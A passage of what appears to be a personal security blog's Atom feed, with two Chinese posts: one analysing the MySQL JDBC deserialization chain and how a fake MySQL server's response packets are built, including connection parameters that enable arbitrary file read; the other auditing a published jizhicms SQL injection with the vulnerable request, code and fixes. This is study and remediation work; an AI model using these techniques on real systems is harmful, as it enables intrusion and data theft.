class="line">                <span class="keyword">try</span> (<span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> ps.executeQuery())&#123;</span><br><span class="line">                    <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">                        <span class="type">long</span> <span class="variable">id</span> <span class="operator">=</span> rs.getLong(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">                        <span class="type">long</span> <span class="variable">grade</span> <span class="operator">=</span> rs.getLong(<span class="string">&quot;grade&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">gender</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;gender&quot;</span>);</span><br><span class="line">                        System.out.println(String.format(<span class="string">&quot;%d %d %s %s&quot;</span>, id, grade, name, gender));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JDBC反序列化"><a href="#JDBC反序列化" class="headerlink" title="JDBC反序列化"></a>JDBC反序列化</h2><h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><p>首先看一下链子是怎么来的</p><p>原作者在<code>com.mysql.cj.jdbc.result.ResultSetImpl.getObject()</code>中发现了一个反序列化的入口</p><p>再找调用了<code>getObject</code>的地方</p><p>在 <code>com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor#populateMapWithSessionStatusValues()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rs = stmt.executeQuery(<span class="string">&quot;SHOW SESSION STATUS&quot;</span>);            ResultSetUtil.resultSetToMap(toPopulate, rs);</span><br></pre></td></tr></table></figure><p>resultSetToMap中调用了readObject</p><p><code>ServerStatusDiffInterceptor</code>是一个拦截器，在JDBC URL中设定属性queryInterceptors为<code>ServerStatusDiffInterceptor</code>时，执行查询语句会调用拦截器的preProcess和postProcess方法, 而<code>preProcess</code>和<code>postProcess</code>又调用了<code>populateMapWithSessionStatusValues</code>, 进而最终触发readObject</p><p>有点乱, 上图:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820140216574.png" alt="image-20240820140216574"></p><p>问题就出在数据库查询<code>SHOW SESSION STATUS</code>返回的rs未经过验证进行反序列化, 造成了一个服务端打客户端的反序列化漏洞</p><p>因此, 下一步是伪造一个mysql数据库返回恶意数据</p><h3 id="伪造mysql服务器"><a href="#伪造mysql服务器" class="headerlink" title="伪造mysql服务器"></a>伪造mysql服务器</h3><p>wireshark抓本地回环的包, 过滤出mysql的数据包</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820140601889.png" alt="image-20240820140601889"></p><p>简单理解一下原理</p><p>以下内容来自 <a href="https://xz.aliyun.com/t/8159">https://xz.aliyun.com/t/8159</a></p><p>No.1699是一个问候报文, </p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820142021243.png" alt="image-20240820142021243"></p><p>直接发送即可</p><p>之后客户端尝试连接数据库, 服务端返回Respone OK, 即 No.1716</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820142206566.png" alt="image-20240820142206566"></p><p>也是直接发送即可</p><p>之后是编写 <code>show session status</code>的响应包</p><blockquote><p><code>show session status</code>属于<strong>request Query</strong> 报文。对于查询数据包的响应包可以分为四种：错误包（ERR Packet）、正确包（OK Packet）、 Protocol::LOCAL_INFILE_Request、结果集（ProtocolText::Resultset）。我们上面看到的<strong>Response OK</strong>数据包就是<strong>OK packet</strong>。</p></blockquote><p>一个结果集响应包的结构。</p><ul><li>数据段1：说明下面的结果集有多少列</li><li>数据段2：列的定义</li><li>数据段3： EOF 包</li><li>数据段4：行数据。</li></ul><h4 id="数据段1"><a href="#数据段1" class="headerlink" title="数据段1"></a>数据段1</h4><p><code>01 00 00 01 02</code> 前三字节表示数据长度为1，sequence id为1，最后一字节02表示有两列</p><h4 id="数据段2"><a href="#数据段2" class="headerlink" title="数据段2"></a>数据段2</h4><p><code>1a000002036465660001630163016301630c3f00ffff0000fcffff000000</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1a 00 00  //3字节表示长度（这个长度说的是协议的内容长度，不包括序号那一字节）</span><br><span class="line">02      //序号 因为是第二个数据字段</span><br><span class="line">03646566  // 这个就是def的意思。</span><br><span class="line">00   //schema 协议因为不使用就用00</span><br><span class="line">01 63  //table 因为我们使用列数据，就不需要名字了，下面几个都是任意字符。字符串第一字节是用来说明长度的。</span><br><span class="line">01 63  //org_table  01表示1字节，63是数据</span><br><span class="line">0163    //name  </span><br><span class="line">0163   //org_name</span><br><span class="line">0c      filler  // length of the following fields 总是0x0c</span><br><span class="line">3f00   //characterset  字符编码 003f是binary </span><br><span class="line">ffff0000  column_length //允许数据最大长度，就是我们行数据的最大长度。ffff</span><br><span class="line">fc    //column_type 这一列数据类型  fc表示blob  </span><br><span class="line">9000    //flags  9000用的官方的 poc可以运行。  看fnmsd的要大于128好像。</span><br><span class="line">00          //decimals</span><br><span class="line">0000        //filler_2</span><br></pre></td></tr></table></figure><h4 id="数据段3"><a href="#数据段3" class="headerlink" title="数据段3"></a>数据段3</h4><p>EOF包</p><h4 id="数据段4"><a href="#数据段4" class="headerlink" title="数据段4"></a>数据段4</h4><p>数据字段4就是POC了。POC其实和上面一样的。计算出长度（3字节）序号（1字节）行数据（行数据第一个字节是数据的长度）</p><p>最终poc直接拿大佬的来用了</p><p><a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p>改一下配置文件直接使用</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240820150150852.png" alt="image-20240820150150852"></p><p>值得注意的是这里居然还有任意文件读取,</p><p>加上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;allowLoadLocalInfile=true&amp;allowUrlInLocalInfile=true&amp;maxAllowedPacket=655360</span><br></pre></td></tr></table></figure><p>即可</p><p>这部分内容直接参考</p><p><a href="https://m0d9.me/2021/04/20/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5/">https://m0d9.me/2021/04/20/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5/</a></p><p><a href="https://xz.aliyun.com/t/12011">https://xz.aliyun.com/t/12011</a></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://xz.aliyun.com/t/8159">https://xz.aliyun.com/t/8159</a></p><p><a href="https://www.anquanke.com/post/id/203086">https://www.anquanke.com/post/id/203086</a></p><p><a href="https://m0d9.me/2021/04/20/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5/">https://m0d9.me/2021/04/20/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5/</a></p><p><a href="https://xz.aliyun.com/t/12011">https://xz.aliyun.com/t/12011</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;JDBC基础&quot;&gt;&lt;a href=&quot;#JDBC基础&quot; class=&quot;headerlink&quot; title=&quot;JDBC基础&quot;&gt;&lt;/a&gt;JDBC基础&lt;/h2&gt;&lt;p&gt;参考&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://liaoxuefeng.com/books/java/</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="JDBC反序列化" scheme="http://example.com/tags/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计之CMS漏洞初探</title>
    <link href="http://example.com/2024/08/01/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BCMS%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2/"/>
    <id>http://example.com/2024/08/01/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BCMS%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2/</id>
    <published>2024-08-01T15:32:50.000Z</published>
    <updated>2024-08-20T07:29:37.827Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP代码审计之CMS漏洞初探"><a href="#PHP代码审计之CMS漏洞初探" class="headerlink" title="PHP代码审计之CMS漏洞初探"></a>PHP代码审计之CMS漏洞初探</h1><p>Java代码实在难懂, 索性先暂时放一放, 最近心血来潮想提升一下php代码审计的能力, (真的很想体验一下真实的挖漏洞)</p><p>话不多说我们随便找几个cms已经公布的漏洞来练练手</p><h2 id="jizhicms-v2-3-3-sql注入"><a href="#jizhicms-v2-3-3-sql注入" class="headerlink" title="jizhicms v2.3.3 sql注入"></a>jizhicms v2.3.3 sql注入</h2><p>这个2.3.3版本下载不到但是能下到2.3.2</p><p><a href="https://gitee.com/Cherry_toto/jizhicms/repository/archive/2.3.2">https://gitee.com/Cherry_toto/jizhicms/repository/archive/2.3.2</a></p><p>搭建好环境开干</p><p>我测试了一下也是存在这个漏洞的</p><p>首先漏洞的点在这个位置</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php/admins/Member/memberedit.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>jizhicms</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>234</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://jizhicms</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://jizhicms/index.php/admins/Member/memberedit/id/2.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=apkas20el5jn5o9070b1gj3176</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">go</span>=<span class="number">1</span>&amp;id=<span class="number">1</span>&amp;username=aaa&amp;openid=rtr&amp;sex=<span class="number">0</span>&amp;gid=<span class="number">0</span>&amp;litpic=&amp;file=&amp;tel=&amp;jifen=<span class="number">0</span>.<span class="number">00</span>&amp;money=<span class="number">0</span>.<span class="number">00</span>&amp;email=&amp;province=&amp;city=&amp;address=&amp;regtime=<span class="number">2024</span>-<span class="number">08</span>-<span class="number">01</span>+<span class="number">22</span>%<span class="number">3</span>A33%<span class="number">3</span>A07&amp;logintime=<span class="number">2024</span>-<span class="number">08</span>-<span class="number">01</span>+<span class="number">22</span>%<span class="number">3</span>A33%<span class="number">3</span>A07&amp;signature=&amp;birthday=&amp;pid=<span class="number">0</span>&amp;isshow=<span class="number">1</span>&amp;pass=&amp;repass=</span></span><br></pre></td></tr></table></figure><p>id参数存在注入</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240801234103555.png" alt="image-20240801234103555"></p><p>那么就去代码中看看</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802003811944.png" alt="image-20240802003811944"></p><p>不难定位到这个逻辑实现的位置</p><p>从源码来看这个cms是一个MVC架构,</p><p>我们主要去看update方法</p><p>调试一下很容易就能定位到</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802004056234.png" alt="image-20240802004056234"></p><p>这段代码是没有过滤的, 有可能存在过滤的位置也就是<code>__prepera_format</code>和<code>runSql</code>这两个方法</p><p>我们先去调试<code>__prepera_format</code>这个方法</p><p>不难看出这里是有问题的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802122153511.png" alt="image-20240802122153511"></p><p>这里的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$value</span>-&gt;Type,<span class="string">&#x27;int&#x27;</span>)!==<span class="literal">false</span> || <span class="title function_ invoke__">stripos</span>(<span class="variable">$value</span>-&gt;Type,<span class="string">&#x27;decimal&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="literal">false</span>)&#123;</span><br><span class="line"><span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="variable">$rows</span>[<span class="variable">$field</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本意应该是通过<code>jz_member</code>的结构来格式化我们查询的内容, 而在<code>jz_member</code>表中<code>id</code>字段应该是<code>int(11)</code>这里虽然正确判断出了id字段为int型, 但是在处理数据时并没有把我们传入的id强转为数字型而是直接进行了赋值</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802122628190.png" alt="image-20240802122628190"></p><p>可以看见id字段仍然是字符串</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802123335763.png" alt="image-20240802123335763"></p><p>同样的问题, <code>$condition</code>也就是传入的id字段的内容,直接被拼接到了where语句后</p><p>我们去跟进<code>runSql</code>也是看不见任何的过滤</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802123538306.png" alt="image-20240802123538306"></p><p>由此造成了sql注入</p><p>那么我们简单修复一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">__prepera_format</span>(<span class="params"><span class="variable">$rows</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$table</span> = <span class="built_in">self</span>::<span class="variable">$table</span>;</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">getTable</span>(<span class="variable">$table</span>);  </span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();  </span><br><span class="line"><span class="variable">$columns</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>(PDO::<span class="variable constant_">FETCH_CLASS</span>);</span><br><span class="line"><span class="variable">$newcol</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$columns</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="variable">$field</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$value</span>-&gt;Field);</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$value</span>-&gt;Type,<span class="string">&#x27;int&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="literal">false</span>)&#123;</span><br><span class="line"><span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="title function_ invoke__">intval</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">elseif</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$value</span>-&gt;Type,<span class="string">&#x27;decimal&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="literal">false</span>)&#123;</span><br><span class="line">                        <span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="title function_ invoke__">floatval</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="number">0.0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="variable">$rows</span>[<span class="variable">$field</span>]!==<span class="literal">false</span> )&#123;</span><br><span class="line"><span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="variable">$rows</span>[<span class="variable">$field</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$newcol</span>[<span class="variable">$field</span>] = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$newcol</span>;</span><br><span class="line"><span class="comment">//return array_intersect_key($rows,$newcol);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240802125221708.png" alt="image-20240802125221708"></p><p>可以看见此时sqlmap已经跑不出来了</p><p>实际上在2.3.2版本是有全局字符串过滤的, 但是并没有包含对id的过滤</p><p>官方的修复手法简单粗暴, 在<code>get_fields_data</code>函数中加上了:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="title function_ invoke__">format_param</span>(<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>这里的format_param函数将id强转为int</p><p><a href="https://www.yijinglab.com/specialized/20230308140107">https://www.yijinglab.com/specialized/20230308140107</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PHP代码审计之CMS漏洞初探&quot;&gt;&lt;a href=&quot;#PHP代码审计之CMS漏洞初探&quot; class=&quot;headerlink&quot; title=&quot;PHP代码审计之CMS漏洞初探&quot;&gt;&lt;/a&gt;PHP代码审计之CMS漏洞初探&lt;/h1&gt;&lt;p&gt;Java代码实在难懂, 索性先暂时放</summary>
      
    
    
    
    
    <category term="PHP代码设计" scheme="http://example.com/tags/PHP%E4%BB%A3%E7%A0%81%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
</feed>
